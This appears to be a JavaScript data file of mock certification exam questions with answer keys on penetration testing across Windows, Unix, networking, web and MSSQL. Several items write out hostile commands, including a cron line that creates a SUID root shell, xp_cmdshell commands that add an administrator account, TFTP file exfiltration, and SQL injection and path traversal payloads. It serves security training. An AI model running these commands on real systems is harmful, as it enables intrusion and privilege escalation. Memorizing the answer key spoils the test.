window.EXAM1 = {
  id: 1,
  title: "Mock Exam 1",
  subtitle: "Windows, Unix, Networking & Core Methodology",
  questions: [
    {id:"1-1",domain:"Windows",q:"You run nbtscan against a /24 subnet and observe a host with the NetBIOS suffix <1C>. What does this indicate?",opts:["The host is running a print spooler service","The host is a domain controller or member of the domain controllers group","The host has a null session enabled","The host is the domain master browser"],ans:1,exp:"NetBIOS suffix <1C> (GROUP) = domain controllers group membership. Multiple DCs can show this. It confirms a DC exists in the domain but doesn't mean this specific host is the ONLY DC. <1D> = master browser, <1B> = domain master browser."},
    {id:"1-2",domain:"Windows",q:"You establish a null session and run user2sid.exe against a DC. The returned SID ends in -500. What account does RID 500 always represent?",opts:["The first domain user created","The krbtgt service account","The built-in Administrator account","The Domain Admins group"],ans:2,exp:"RID 500 is universally the built-in Administrator on ALL Windows systems. RID 501=Guest, 502=krbtgt, 512=Domain Admins group, 1000+=standard accounts. Knowing this lets you find the true Administrator name even if renamed."},
    {id:"1-3",domain:"Windows",q:"nmap '--script smb-check-vulns -p445' shows 'MS08-067: VULNERABLE'. Which Metasploit payload approach minimises risk on a live engagement?",opts:["reverse_tcp meterpreter with staged payload","A simple adduser payload first, then pivot from the gained account","ms08_067_netapi with bind_tcp to avoid firewall issues","Default payload and rely on autorouting"],ans:1,exp:"On live engagements, adduser is safest. MS08-067 can be unstable — a simple net user payload is less likely to crash the target than full meterpreter. The source material explicitly recommends: 'keep the exploit as simple as possible — a simple adduser payload will suffice.'"},
    {id:"1-4",domain:"Windows",q:"nbtstat -A shows DOMAIN<1C> GROUP Registered. A colleague claims this means the host IS the DC. Why is this wrong?",opts:["<1C> only appears on workstations, not DCs","<1C> indicates membership of the DC group, not that this specific host is the only DC","<1C> identifies the master browser, not the DC","nbtstat -A cannot identify DCs; only nmap can"],ans:1,exp:"DOMAIN<1C> is a GROUP registration — this host belongs to the DC group. Multiple DCs can exist. To confirm a specific DC, look for both <1C> and <1B>, or use ldapsearch. The common exam trap is conflating group membership with identity."},
    {id:"1-5",domain:"Windows",q:"enum -P 192.168.1.72 shows 'lockout threshold: none'. What attack becomes trivially feasible?",opts:["Pass-the-hash attacks using extracted NTLM hashes","Online brute force against SMB without risk of account lockout","Rainbow table attacks against the SAM database","Kerberoasting of service account tickets"],ans:1,exp:"No lockout threshold = unlimited password attempts via SMB without triggering lockouts. This makes online brute force (hydra -e ns against SMB) viable. Pass-the-hash and rainbow tables are offline attacks not prevented by lockout policy anyway."},
    {id:"1-6",domain:"Windows",q:"RDP access to a locked-down host. Only Notepad is permitted to run. Which sequence CORRECTLY escapes this using ftp.exe?",opts:["Open Notepad, type 'ftp.exe', save as .bat, execute, prefix commands with !","Open Notepad, use File > Open to browse to ftp.exe and execute it directly","Right-click desktop, select Run, type ftp.exe","Use the Notepad print dialog to spawn cmd.exe as SYSTEM"],ans:0,exp:"Documented breakout: Notepad → type 'ftp.exe' → save as .bat → execute → from FTP shell, prefix OS commands with ! (e.g., !taskmgr.exe, !reg query). The FTP shell in Windows allows OS command execution via the ! prefix — a classic desktop breakout vector."},
    {id:"1-7",domain:"Windows",q:"Windows 2000 SNMP with community string 'public'. From a security standpoint, how should SNMP community strings be treated?",opts:["Community strings are encrypted in SNMPv2 so interception is not a concern","Community strings should be treated as passwords since they grant access to MIB data","Default community strings only expose hardware information","SNMPv1 community strings cannot be changed on Windows 2000"],ans:1,exp:"SNMPv1/v2c community strings are transmitted in cleartext and act as passwords granting access to the MIB tree. On Windows 2000, 'public' can expose user account lists, services, and interfaces. The source explicitly states: 'Community string should be treated like passwords.'"},
    {id:"1-8",domain:"Windows",q:"Anonymous LDAP bind attempt against Windows Server 2003 using ldp.exe fails. What is the MOST likely reason?",opts:["ldp.exe is not compatible with Windows Server 2003","Anonymous LDAP binds are disabled by default from Windows Server 2003 onwards","The LDAP service is not running on port 389","LDAP requires Kerberos authentication on all Windows Server versions"],ans:1,exp:"Windows 2003 onwards disabled anonymous LDAP binds by default to prevent unauthenticated AD enumeration. The source explicitly notes: 'from Windows 2003 onwards, anonymous binds are disabled by default.' Windows 2000 allowed this, making it a key OS version distinction."},
    {id:"1-9",domain:"Windows",q:"RID cycling: after finding the base SID, you start incrementing from 1000. Why not start from 501?",opts:["RIDs below 1000 are reserved and cannot be queried via null sessions","Standard user accounts begin at RID 1000; RIDs below this are reserved for built-in accounts","sid2user.exe cannot resolve RIDs below 1000 due to a bug","Starting at 1000 avoids triggering account lockout on built-in accounts"],ans:1,exp:"RIDs 500-999: built-in accounts (500=Administrator, 501=Guest, 502=krbtgt, 512-580=built-in groups). Standard domain user accounts begin at RID 1000. Cycling from 1000 upward finds real custom user accounts. Built-in accounts are already known; the value is discovering custom accounts."},
    {id:"1-10",domain:"Windows",q:"GetAcct shows RID 512 resolves to 'Domain Admins' and RID 513 to 'Domain Users'. What SID object type is RID 512?",opts:["SidTypeUser","SidTypeAlias","SidTypeGroup","SidTypeDomain"],ans:2,exp:"SID types: SidTypeUser=individual user accounts, SidTypeGroup=global/universal security groups (Domain Admins, Domain Users), SidTypeAlias=local built-in groups (Administrators, Users), SidTypeDomain=the domain itself. Domain Admins and Domain Users are global security groups → SidTypeGroup."},
    {id:"1-11",domain:"Windows",q:"An LM hash appears as 'AAD3B435B51404EEAAD3B435B51404EE'. What does this specific value indicate?",opts:["The password is exactly 7 characters long","The password contains only uppercase letters","The account has no password or an empty password","LM hashing has been disabled and this is a placeholder"],ans:2,exp:"AAD3B435B51404EE is the DES encryption of 'KGS!@#$%' with a null (zero) 7-byte key — the result when a password half is empty. When both halves match this value, the account has no password set. This is the universal 'no password' sentinel value in LM hashes."},
    {id:"1-12",domain:"Windows",q:"Ophcrack is loaded with XP special rainbow tables against an LM hash. Which portion is attacked first for maximum speed?",opts:["The full NTLM hash using rainbow tables","The first LM half (up to 7 characters) since LM halves can be attacked independently","The second 7-character LM half as it is typically weaker","The NT hash directly since LM is not stored on XP SP3"],ans:1,exp:"LM hashes split the password into two 7-character halves, each hashed independently with DES. Ophcrack attacks each half separately via precomputed rainbow tables. This splitting is LM's critical weakness — you only crack 7-character keyspace twice rather than 14 characters combined, reducing the effective search space enormously."},
    {id:"1-13",domain:"Cryptography",q:"What specific property of NTLMv2 makes it significantly harder to crack offline compared to NTLMv1?",opts:["NTLMv2 uses AES-128 instead of DES","NTLMv2 incorporates a client-side random nonce and HMAC-MD5, making each response unique even for the same password","NTLMv2 uses salted SHA-256 stored in the SAM database","NTLMv2 responses are encrypted with the domain controller's public key"],ans:1,exp:"NTLMv2 includes a randomly generated client challenge in the response computation. Combined with server challenge, username, domain, and timestamp using HMAC-MD5, every NTLMv2 response is unique — even for the same password. This defeats precomputed rainbow table attacks. NTLMv1's fixed computation against an 8-byte server challenge is far more vulnerable."},
    {id:"1-14",domain:"Post-Exploitation",q:"A colleague suggests 'cracking is not always necessary' for lateral movement after recovering NTLM hashes. What technique makes cracking unnecessary?",opts:["Token impersonation using incognito","Pass-the-hash using the NTLM hash directly to authenticate to other SMB resources","Kerberos golden ticket generation using the recovered hash","Pass-the-ticket using a captured TGT from memory"],ans:1,exp:"Pass-the-hash (PtH): Windows authentication uses the NTLM hash directly in the protocol — the plaintext password is never transmitted. Tools like psexec, smbclient, and impacket's wmiexec accept the hash instead of the password. This is why hash recovery is as dangerous as password recovery."},
    {id:"1-15",domain:"Windows",q:"hydra -e ns -l Duw -P words 192.168.1.72 smb — what does the 'n' in '-e ns' specifically test?",opts:["It tests null (empty) passwords","It tests the username as the password","It tests common numeric password patterns","It disables parallel connection attempts"],ans:0,exp:"Hydra's -e option: 'n' = null/empty password, 's' = use the login name as the password. '-e ns' tests both empty password AND username-as-password for each account. This is highly effective since lazy admins often leave service accounts with no password or username=password credentials."},
    {id:"1-16",domain:"Windows",q:"LSA secrets at HKLM\\SECURITY\\Policy\\Secrets accessed via 'AT 18:12 regedt32 /i'. Why is the /i flag significant?",opts:["It runs regedt32 in interactive mode, allowing it to interact with the desktop as SYSTEM","It imports a registry hive rather than launching the GUI","It instructs regedt32 to ignore read-only registry keys","It enables logging of all registry access"],ans:0,exp:"AT command runs tasks as SYSTEM. The /i flag makes the task interactive — it appears on the current user's desktop session. This is crucial for regedt32 since you need to interact with the GUI to browse to HKLM\\SECURITY, which is normally inaccessible to administrative accounts but readable by SYSTEM."},
    {id:"1-17",domain:"Windows",q:"A service runs as 'SDY\\Administrator' (domain admin). LSA secret extraction reveals the plaintext password. Why is this particularly dangerous?",opts:["Domain admin passwords are stored unencrypted in LSA secrets by design","Recovering the service account password grants domain-wide administrative access, not just local access","Service accounts running as domain admins are exempt from password policy","LSA secrets for domain accounts are replicated to all domain controllers"],ans:1,exp:"When a service runs as a domain admin account, the password is stored in LSA secrets for service startup. Extracting it gives domain admin credentials usable anywhere in the domain — not just locally. The source shows MSSQL running as SDY\\Administrator, and LSA secret extraction revealing the cleartext password for full domain compromise."},
    {id:"1-18",domain:"Post-Exploitation",q:"When would you use Keimpx's spray functionality over a targeted pass-the-hash attack?",opts:["When you want to crack the hash before attempting authentication","When you have a valid hash and want to identify ALL hosts where those credentials are valid across the network","When the target only accepts Kerberos authentication","When the target account has a lockout policy configured"],ans:1,exp:"Keimpx spray: takes a hash (or list of hashes) and tests it against a list of target IPs to find where those credentials work. Essential for lateral movement — you have a domain user's hash and want to know which machines they have admin access on. The source demonstrates Keimpx finding the 'donkey' user's hash valid on two different hosts."},
    {id:"1-19",domain:"Cryptography",q:"A sysadmin argues salting LM hashes would prevent rainbow table attacks. Why is this argument flawed?",opts:["LM hashes ARE salted but rainbow tables have been pre-computed for all salts","LM hashes don't use salts; the weakness is DES-based computation, forced uppercase, and 7-character splitting","Salting only helps against brute force, not rainbow table attacks","Rainbow tables cannot be used against LM hashes; only dictionary attacks work"],ans:1,exp:"LM hash fundamental weaknesses: (1) No salt whatsoever, (2) ALL characters forced to uppercase before hashing — reducing keyspace, (3) Password split into 7-character halves hashed independently, (4) DES as the cipher. Salting would help only weakness 1. Weaknesses 2, 3, and 4 remain. The correct fix is disabling LM hashing entirely (Vista+ default)."},
    {id:"1-20",domain:"Windows",q:"SVC_CACLS.exe identifies cvpnd.exe (Cisco VPN) as writable by the Users group. What is the CORRECT exploitation sequence?",opts:["Modify the registry key pointing to cvpnd.exe to execute cmd.exe instead","Replace cvpnd.exe with taskmgr.exe, reboot — the service restarts running taskmgr with elevated privileges","Inject shellcode into the running cvpnd.exe process","Use SVC_CACLS.exe to directly escalate the service token to SYSTEM"],ans:1,exp:"The source explicitly documents: (1) Run SVC_CACLS.exe as low-priv user, (2) Replace the vulnerable executable with taskmgr.exe, (3) Reboot to restart the service, (4) Launch tasks with high privilege. taskmgr.exe is chosen because it's interactive — when the service restarts as SYSTEM, taskmgr runs elevated, allowing you to launch anything with SYSTEM privileges."},
    {id:"1-21",domain:"Unix",q:"A file shows '-rwsr-xr-x 1 root root /usr/bin/passwd'. What does the lowercase 's' in the owner execute position enable?",opts:["Sticky bit preventing other users from deleting the file","The set-user-ID bit causing the binary to run with the file owner's (root) privileges regardless of who executes it","The set-group-ID bit allowing group-level privilege escalation","Mandatory access control restricting execution to audited sessions"],ans:1,exp:"SUID (Set User ID) on a root-owned binary causes execution with root's effective UID, regardless of which user runs it. This is why passwd can modify /etc/shadow (root-owned, mode 640) — it needs root privilege. This mechanism underpins many Unix privilege escalation techniques via SUID binaries."},
    {id:"1-22",domain:"Unix",q:"You add to root's crontab: '08 * * * * root cp /bin/sh /tmp/sh; chmod 4777 /tmp/sh'. What happens when this triggers?",opts:["Copies bash to /tmp and makes it world-readable but not executable","Creates a SUID root shell in /tmp that any user can execute to get a root shell","Backs up the system shell to /tmp as a recovery mechanism","Creates a task that runs as the current user every 8 minutes"],ans:1,exp:"chmod 4777 sets: SUID (4), rwx owner (7), rwx group (7), rwx others (7). Since the copy and chmod run as root, /tmp/sh is owned by root with SUID set. Any user running /tmp/sh gets a root shell. This is a classic Unix privilege escalation via cron write access — the SUID bit on a root-owned shell grants root access to all."},
    {id:"1-23",domain:"Unix",q:"Directory listing shows 'drwxrwxrwt 12 root root /tmp'. What does the lowercase 't' indicate?",opts:["The directory has the SUID bit set, running as root","Sticky bit is set AND execute bit for others IS set; only the file creator can delete their own files","The directory is read-only despite apparent write permissions","SGID bit is set for group-level file creation"],ans:1,exp:"Lowercase 't' = sticky bit WITH execute bit for others set. Everyone can create files in /tmp (rwxrwxrwx base), but ONLY the file's owner (and root) can delete their files. Capital 'T' = sticky bit set but execute bit for others NOT set. /tmp always uses the sticky bit to prevent users deleting each other's temp files."},
    {id:"1-24",domain:"Unix",q:"'lsof -i' shows 'sshd 2474 root 3u IPv4 5721 TCP *:ssh (LISTEN)'. What does this output confirm?",opts:["SSH is running on a non-standard port and listening for outbound connections","SSH is running as root and listening on all interfaces on the standard SSH port","SSH is configured for IPv4 only and is not accepting connections","The sshd process has a file descriptor leak indicated by '3u'"],ans:1,exp:"Decode: process=sshd, PID=2474, running as root, fd=3u (regular file descriptor — not a leak), IPv4, port=:ssh (22), TCP LISTEN on * (all interfaces). Running sshd as root is standard — it needs root to bind port 22 and perform privilege separation. '3u' simply means file descriptor 3 opened for read+write (normal)."},
    {id:"1-25",domain:"Unix",q:"'finger -l dba@172.16.2.148' response includes 'My Password is Cymru' in the .plan field. What vulnerability category is this?",opts:["Information disclosure through the finger daemon exposing credentials in user .plan files","Buffer overflow in the finger daemon","Cleartext credential transmission over the network","Social engineering via directory information service"],ans:0,exp:"Information disclosure: the user stored their password in .plan which finger exposes to anyone reaching port 79. The vulnerability combines: (1) finger daemon exposed externally, (2) no access controls on .plan content, (3) user storing sensitive data in .plan. The source documents this exact scenario — 'My Password is Cymru' — as a finding in the finger daemon section."},
    {id:"1-26",domain:"Unix",q:"NFS configured: '/home 192.168.1.0/24(rw,root_squash,nosuid,noexec)'. What does root_squash specifically prevent?",opts:["Remote users from reading files owned by root","Multiple simultaneous users accessing the share","Incoming requests from the root user being honoured; they are mapped to the anonymous UID","SUID binaries on the mounted share from executing with elevated privileges"],ans:2,exp:"root_squash maps incoming NFS requests from UID 0 (root) on the client to the anonymous UID (typically nobody). Without it, a client's root user would have root access on the NFS share. nosuid prevents SUID binaries on the share from executing elevated. noexec prevents running binaries. Three separate protections working together."},
    {id:"1-27",domain:"Unix",q:"After mounting an NFS share as user 'ed' (UID 1001), directory 'stest' owned by UID 1337 is unreadable. What is the correct technique to access it?",opts:["Use 'sudo -u stest ls -al' to switch user context","Create a local user with UID 1337, switch to that user, then access the mounted directory","Modify /etc/exports on the NFS server to remove UID restrictions","Use 'chown ed stest' on the mounted directory"],ans:1,exp:"NFS uses UIDs for access control, not usernames. Create a local user with the same UID as the remote file owner (UID 1337): 'adduser --uid 1337 stest', then 'su - stest'. NFS grants that local user access because the UIDs match. This is classic NFS UID squatting — documented in the source with exactly this UID 1337 scenario."},
    {id:"1-28",domain:"Unix",q:"SMTP VRFY root returns '250 2.1.5 Super-User <root@server>'. What should you do next?",opts:["root is valid; use VRFY against a wordlist to enumerate additional valid usernames","root has mail forwarding; send a phishing email","The mail server version is vulnerable; exploit it directly","Avoid EXPN as it is illegal during a penetration test"],ans:0,exp:"250 confirms root is a valid user. Next: username enumeration at scale — use VRFY (or EXPN for mailing lists) with a wordlist of common Unix usernames to build a valid user list for targeted brute force or password spraying. EXPN is entirely legal during an authorised pentest. The source shows both VRFY and EXPN in use against sendmail."},
    {id:"1-29",domain:"Unix",q:"Before running John the Ripper, a tester runs '$unshadow pwd shd > run'. Why is this step necessary?",opts:["John requires a specific file encoding that unshadow provides","unshadow combines /etc/passwd and /etc/shadow into a single file with both username and hash that John requires","The shadow file contains only usernames; unshadow extracts the hash portion","John cannot read the colon-separated format of /etc/shadow without preprocessing"],ans:1,exp:"Modern Unix splits credentials: /etc/passwd (world-readable, has username/UID/shell) and /etc/shadow (root-readable, has the hash). John needs BOTH — the username for display and the hash for cracking. unshadow merges them into a single file in the old-style passwd format. The source shows the exact '$unshadow pwd shd > run' command then '$john run'."},
    {id:"1-30",domain:"Cryptography",q:"A Unix password hash appears as '$6$rP1wFKQN$Un1fLI3f...'. What algorithm is in use and its relative strength?",opts:["$6$ = SHA-512; significantly stronger than MD5 ($1$) due to larger output and configurable iterations","$6$ = SHA-256; slightly stronger than MD5","$6$ = bcrypt; the strongest algorithm in Unix","$6$ = Blowfish; stronger than MD5 but weaker than SHA-1"],ans:0,exp:"Unix shadow file hash prefixes: $1$=MD5, $2a$/$2b$=bcrypt, $5$=SHA-256, $6$=SHA-512. SHA-512 ($6$) with configurable iteration count (rounds=) is significantly stronger than MD5 ($1$) which is fast and has no iteration count. The source shows all three formats. For cracking priority: attack $1$ first, then $5$, then $6$."},
    {id:"1-31",domain:"Networking",q:"TCP ports 514, 512, 513 are open on a Unix host. What service family and primary security concern?",opts:["SSH service family; key-based authentication should be enforced","Berkeley r-services (rsh/rexec/rlogin); transmit credentials in cleartext and .rhosts trust relationships can be abused","Syslog family; log poisoning attacks are possible","RPC services; portmapper can enumerate all registered services"],ans:1,exp:"512/exec=rexec, 513/login=rlogin, 514/shell=rsh — Berkeley r-services (r-commands). Primary risks: (1) all cleartext, (2) .rhosts and /etc/hosts.equiv allow passwordless auth based on IP/hostname easily spoofed, (3) historical vulnerabilities. The source dedicates Section F6 entirely to r-services attacks."},
    {id:"1-32",domain:"Unix",q:"A .rhosts file contains '+ +'. What does this configuration allow?",opts:["Only hosts listed in /etc/hosts.equiv to connect without authentication","Any host to connect as any user (including root) without password authentication","Password authentication from all trusted subnets","Connections only from localhost without requiring a password"],ans:1,exp:"'+ +' in .rhosts: first '+' = any host, second '+' = any user. Anyone from anywhere can authenticate as any user without a password. The source states: 'a + + would allow a connection from any host as any user (including root).' One of the most dangerous Unix misconfigurations documented."},
    {id:"1-33",domain:"Unix",q:"X11 server has 'xhost +' configured. You run 'xwd -root -display 192.168.226.200:0 | xwud'. What is achieved?",opts:["A reverse shell is spawned from the remote X11 server","The remote desktop session is captured and displayed on the attacker's machine","The .Xauthority cookie is extracted for replay attacks","The X11 display is crashed causing a denial of service"],ans:1,exp:"xhost + disables X11 access control — any host can connect. xwd (X Window Dump) captures the root window as an XWD image. Piped to xwud (X Window Undump) it displays locally. Result: you see the remote user's screen in real-time. The source shows this capturing a Solaris desktop from a Linux attacker machine — a classic information disclosure via X11."},
    {id:"1-34",domain:"Unix",q:"rpcinfo -p shows sadmind listed on a Solaris host. What is the primary risk?",opts:["sadmind allows anonymous NFS mounts to root filesystem","Remote code execution vulnerabilities in sadmind allow root-level compromise of Solaris systems","sadmind exposes the shadow password file via RPC","sadmind enables unauthenticated LDAP queries"],ans:1,exp:"sadmind (Solaris Admin Daemon) has had severe RCE vulnerabilities. The source shows the rootdown.pl exploit achieving code execution and Metasploit having sadmind exploits. It's described as 'Sadmind bad boy is probably the most famous' RPC service vulnerability. Exploiting it can achieve root-equivalent access on Solaris systems."},
    {id:"1-35",domain:"Networking",q:"How would you confirm FTP credentials are transmitted in cleartext during a capture exercise?",opts:["Use nmap --script ftp-anon to detect cleartext transmission","Capture traffic with Wireshark and follow the TCP stream to see the USER/PASS exchange in plaintext","Run a man-in-the-middle attack using arpspoof before connecting","Use Nessus to identify the FTP banner and infer cleartext authentication"],ans:1,exp:"FTP (RFC 959) transmits EVERYTHING including authentication in plaintext over TCP. Wireshark's 'Follow TCP Stream' on port 21 shows the literal USER/PASS commands with credentials visible. The source shows a Wireshark TCP stream capture showing 'PASS Password1' in the clear. This is why SFTP/FTPS exist as secure alternatives."},
    {id:"1-36",domain:"Networking",q:"A network is 192.168.10.0/27. How many usable host addresses are available?",opts:["30","32","28","14"],ans:0,exp:"/27 = 5 host bits. 2^5 = 32 total addresses. Subtract network address and broadcast: 32 - 2 = 30 usable hosts. Subnet mask: 255.255.255.224. Valid range: 192.168.10.1-30, broadcast: 192.168.10.31. Essential CREST calculation: memorise 2^n for n=1-8: 2,4,8,16,32,64,128,256."},
    {id:"1-37",domain:"Networking",q:"A TCP three-way handshake is followed immediately by an RST from the server. What does this most likely indicate?",opts:["Port is open and the service rejected the connection due to authentication failure","Port is closed; RST is the kernel-level response to a connection attempt on a non-listening port","Port is filtered by a firewall generating the RST","The service crashed upon receiving the connection"],ans:1,exp:"RST immediately after SYN (no SYN-ACK) = closed port; the OS kernel rejects the connection. SYN→SYN-ACK→ACK→RST (after handshake completes then RST) = port open but app rejected it. The question implies RST in response to SYN = closed. If a firewall sends RST (firewall reject vs drop), the port shows as closed not filtered."},
    {id:"1-38",domain:"Networking",q:"An nmap SYN scan shows a port as 'filtered'. What BEST explains this state?",opts:["Port is open but the service is not responding to the nmap probe","No response received or ICMP unreachable returned, indicating a firewall is dropping packets","Port responded with SYN-ACK but no RST, indicating a proxy","The service requires authentication before accepting connections"],ans:1,exp:"nmap 'filtered' state means: (1) no response to the SYN probe (packet silently dropped by firewall), OR (2) ICMP type 3 unreachable (admin prohibited). Both indicate a firewall. 'Open' = SYN-ACK received. 'Closed' = RST received. 'Filtered' = no answer or ICMP unreachable = firewall present."},
    {id:"1-39",domain:"Networking",q:"You identify TCP/111 open. What service is this and what subsequent command is most useful?",opts:["LDAP; use ldapsearch to enumerate directory objects","Portmapper/rpcbind; use rpcinfo -p <ip> to enumerate all RPC services registered","Kerberos; use kinit to request a ticket-granting ticket","IDENT; use nc to query the service for process information"],ans:1,exp:"TCP/UDP 111 = portmapper/rpcbind. All RPC services register with portmapper. 'rpcinfo -p <ip>' lists all registered RPC services with program numbers, versions, and ports. This reveals NFS, mountd, sadmind, rusers, statd, etc. A critical Unix reconnaissance step — the portmapper is the gateway to finding all RPC attack surface."},
    {id:"1-40",domain:"Unix",q:"TFTP used on a compromised host: 'tftp 192.168.226.1' then 'put f'. Where does file 'f' end up?",opts:["In the current working directory of the TFTP client on the compromised host","In the TFTP root directory on 192.168.226.1 (the attacker's TFTP server)","Encoded in UDP packet headers as a data transfer payload","In /tmp of the remote host if TFTP write access is enabled"],ans:1,exp:"TFTP 'put' uploads FROM the client TO the server. The file goes to the TFTP root directory on 192.168.226.1 (the attacker's machine running a TFTP server). This is used post-exploitation to exfiltrate files from a compromised host. The source shows this technique with SolarWinds TFTP server as the receiver."},
    {id:"1-41",domain:"Web",q:"You inject '<script>alert(1)</script>' into a search field and the browser executes it. The script is reflected in the URL. What type of XSS is this?",opts:["Stored XSS; persistent because the script is stored in the database","Reflected XSS; non-persistent because the script only executes when a crafted URL is visited","DOM-based XSS; non-persistent because it manipulates the DOM without server interaction","Second-order XSS; persistent because the payload is stored in a session"],ans:1,exp:"Reflected XSS: payload is in the HTTP request (URL parameter) and reflected back in the response without storage. Executes only when the victim clicks a crafted link. Stored XSS requires saving to database and serving to other users. DOM-based XSS would manipulate the DOM client-side without a server round-trip."},
    {id:"1-42",domain:"Web",q:"SQL injection: ' UNION SELECT username,password FROM users-- . What condition MUST be met for UNION-based injection to succeed?",opts:["The database must be MySQL and the target table must have a primary key","The number and data types of columns in the UNION SELECT must match the original query","SQL comments must be enabled on the database server","The application must use parameterised queries with a fallback mechanism"],ans:1,exp:"UNION requires: (1) same number of columns as the original SELECT, (2) compatible data types in corresponding positions. If the original query selects 3 columns, your UNION SELECT must also select 3. Use NULL for type flexibility. ORDER BY can help determine column count. This is fundamental SQL injection knowledge tested in every CREST exam."},
    {id:"1-43",domain:"Web",q:"HTTP response contains 'Set-Cookie: sessionid=abc123; HttpOnly'. What does HttpOnly specifically mitigate?",opts:["CSRF by preventing cross-origin cookie transmission","Session fixation by binding the cookie to the client IP","JavaScript-based session cookie theft, mitigating XSS-driven session hijacking","Cookie replay attacks by encrypting the session identifier"],ans:2,exp:"HttpOnly prevents JavaScript from accessing the cookie via document.cookie. This directly mitigates XSS-based session hijacking — even if an XSS payload executes, it cannot steal the session cookie. HttpOnly doesn't prevent CSRF (use SameSite/CSRF tokens), doesn't prevent network interception (use Secure flag), and doesn't encrypt the cookie."},
    {id:"1-44",domain:"Web",q:"You modify a hidden field from 'price=100' to 'price=1'. The server accepts the modified value. What vulnerability class is this?",opts:["SQL injection in the price parameter","Client-side validation bypass / parameter tampering","Server-side request forgery (SSRF)","Business logic flaw via insecure direct object reference"],ans:1,exp:"Parameter tampering / client-side trust: the server accepts user-controlled input for price without server-side validation. Business logic (pricing) relies on client-supplied data. Fix: never trust client-supplied prices; look up prices server-side from the product catalog. This is a fundamental web application security issue found in e-commerce platforms."},
    {id:"1-45",domain:"Web",q:"URL: 'http://app.com/file?path=../../etc/passwd' returns Unix user data. What attack is this and what prevents it?",opts:["Remote file inclusion; disabled by allow_url_include=0","Local file inclusion / path traversal; prevented by canonicalising paths and validating against a whitelist of permitted directories","SQL injection via file parameter; prevented by parameterised queries","XML external entity injection; prevented by disabling external entity processing"],ans:1,exp:"Path traversal (directory traversal): using '../' to navigate outside the intended directory. Fix: (1) canonicalise the path using realpath(), (2) validate it starts with the allowed base directory, (3) whitelist allowed filenames. Using a whitelist is most robust. 'LFI' refers specifically to PHP's include() with code execution — this is a pure path traversal."},
    {id:"1-46",domain:"Web",q:"A login page returns different messages: 'user not found' versus 'incorrect password'. What does this enable?",opts:["Timing-based SQL injection against the authentication query","Username enumeration, allowing an attacker to confirm valid accounts before targeted brute force","Blind LDAP injection to dump directory contents","Session prediction by correlating error codes with session tokens"],ans:1,exp:"Different error messages for invalid username vs. invalid password = username enumeration. An attacker can iterate usernames until they see 'incorrect password' (confirming the username exists), then brute force only that account. Fix: return the same generic message regardless — 'Invalid credentials' — for both wrong username and wrong password."},
    {id:"1-47",domain:"Web",q:"Application uses HTML entity encoding before reflecting input. Tester injects '&lt;script&gt;'. The browser shows the literal string. What does this demonstrate?",opts:["The application is vulnerable to second-order XSS","HTML entity encoding is functioning correctly, preventing XSS in this context","The browser's XSS filter is blocking the attack independently","The application is vulnerable to DOM-based XSS through innerHTML"],ans:1,exp:"Proper HTML entity encoding converts < to &lt; and > to &gt;, causing the browser to display them as text rather than parse them as HTML. This CORRECTLY prevents XSS in HTML context. Note: entity encoding may NOT prevent XSS if the output is in a JavaScript context (need JS encoding) or an unquoted attribute (need attribute encoding)."},
    {id:"1-48",domain:"Web",q:"An app uses MD5 without salt for passwords. Hash is '5f4dcc3b5aa765d61d8327deb882cf99'. Most efficient recovery technique?",opts:["Brute force starting from single-character passwords","Rainbow table lookup; this hash is MD5('password')","John the Ripper with --wordlist using a large dictionary","HMAC-MD5 collision attack exploiting the birthday paradox"],ans:1,exp:"For unsalted MD5, rainbow table lookup is fastest — O(1) lookup versus O(n) dictionary attack. The hash 5f4dcc3b5aa765d61d8327deb882cf99 = MD5('password') — one of the most common passwords, appearing in every rainbow table and pre-computed database (CrackStation). Salting would defeat rainbow tables by making each hash unique."},
    {id:"1-49",domain:"Web",q:"A REST API returns verbose stack traces with database query details on invalid input. Beyond information disclosure, what is the PRIMARY security risk?",opts:["Stack traces consume excessive server resources enabling DoS","Disclosed database structure, table names, and query patterns directly facilitate targeted SQL injection","Error messages fingerprint the exact server version for CVE exploitation","Verbose errors indicate the application lacks input validation entirely"],ans:1,exp:"The PRIMARY risk is that verbose errors reveal database schema: table names, column names, exact query structure. An attacker knowing 'SELECT id, email, password FROM users WHERE id = ?' can craft highly targeted injection payloads. Information disclosure is the finding; targeted SQL injection is the impact that elevates the severity."},
    {id:"1-50",domain:"Web",q:"A CSRF attack requires which conditions to succeed against a state-changing HTTP request?",opts:["Attacker must be on the same network as the victim","Victim must be authenticated and the application must rely solely on cookie-based authentication without CSRF tokens or SameSite attributes","The application must be vulnerable to XSS to deliver the CSRF payload","Attacker must know the victim's session identifier"],ans:1,exp:"CSRF conditions: (1) victim is authenticated, (2) app uses cookies for sessions without anti-CSRF tokens, (3) the forged request can be triggered by the victim's browser. The attacker doesn't need the session ID — the browser automatically sends it. XSS is one delivery mechanism but not required. SameSite cookies are the modern mitigation."},
    {id:"1-51",domain:"Database",q:"MSSQL SA account with blank password. Attacker executes EXEC XP_CMDSHELL 'net user hacker P@ss /add'. What privilege level is required for this to succeed at the OS level?",opts:["Any authenticated database user with SELECT privileges","The SQL Server service must be running with at least local administrator rights on the host OS","The SA account must be sysadmin, which it is by default","Only Windows authentication mode must be enabled"],ans:1,exp:"XP_CMDSHELL executes OS commands with the SQL Server service account's privileges. For 'net user' to succeed (adding an OS user), the SQL Server service account needs local administrator rights on the OS. SA = database admin only, not OS admin. If SQL runs as NETWORK SERVICE, net user may fail even though XP_CMDSHELL executes."},
    {id:"1-52",domain:"Database",q:"XP_CMDSHELL is disabled on an MSSQL instance. The SA password has been recovered. What re-enables it?",opts:["EXEC sp_addextendedproc 'xp_cmdshell', 'xplog70.dll'","EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE","ALTER SERVER CONFIGURATION SET xp_cmdshell ON","EXEC master..xp_cmdshell 'enable'"],ans:1,exp:"sp_configure is the correct method for SQL Server 2005+: EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; The old sp_addextendedproc method was for SQL Server 2000. RECONFIGURE is required to apply the change. Without RECONFIGURE, the setting doesn't take effect."},
    {id:"1-53",domain:"Database",q:"Connected to MSSQL as SA. Which XP_CMDSHELL command adds a user to local administrators?",opts:["EXEC XP_CMDSHELL 'net localgroup administrators hacker /add'","EXEC XP_CMDSHELL 'net user hacker /admin'","EXEC XP_CMDSHELL 'runas /user:administrator cmd'","EXEC XP_CMDSHELL 'adduser hacker administrators'"],ans:0,exp:"Correct Windows syntax: 'net localgroup administrators <username> /add'. The user must exist first (net user hacker Password123 /add). 'net user /admin' doesn't exist as syntax. 'runas' requires a password. 'adduser' is Linux syntax. The source shows exactly this command being used post-MSSQL compromise."},
